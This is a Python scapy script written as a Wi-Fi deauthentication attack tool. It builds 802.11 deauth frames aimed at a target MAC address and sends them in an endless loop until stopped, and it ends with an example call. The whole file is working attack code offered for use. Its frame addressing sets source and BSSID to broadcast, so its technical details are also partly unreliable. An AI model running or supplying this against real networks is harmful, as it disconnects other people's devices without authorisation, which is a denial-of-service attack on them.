from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
import time
import subprocess

def deauth_attack(interface, target):
    """
    Performs a deauthentication attack on the specified target using the given network interface.
    
    Args:
        interface (str): The network interface to use for the attack.
        target (str): The MAC address of the target device.
    """
    # Create a deauthentication packet
    broadcast = "ff:ff:ff:ff:ff:ff"
    packet = RadioTap() / Dot11(addr1=target, addr2=broadcast, addr3=broadcast) / Dot11Deauth() # 1: target, 2: source, 3: BSSID
    
    print(f"Starting deauthentication attack on {target} using interface {interface}")
    
    try:
        # Send the packet in a loop
        while True:
            sendp(packet, iface=interface, count=100, inter=0.1, verbose=1)
            print(f"Sent deauth packet to {target}")
            time.sleep(1)
    except KeyboardInterrupt:
        print("Deauthentication attack stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")

# Example usage:
# deauth_attack("wlan0", "00:11:22:33:44:55")
